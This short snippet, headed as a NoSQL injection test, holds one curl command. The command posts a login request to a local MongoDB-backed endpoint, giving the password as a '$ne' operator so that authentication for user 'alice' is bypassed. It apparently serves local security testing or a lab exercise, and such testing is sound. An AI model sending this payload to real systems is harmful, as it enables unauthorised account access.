# NoSQLi (login)
curl -X POST http://localhost:8000/login_mongo -H "Content-Type: application/json"   -d '{"username":"alice","password":{"$ne":"x"}}'
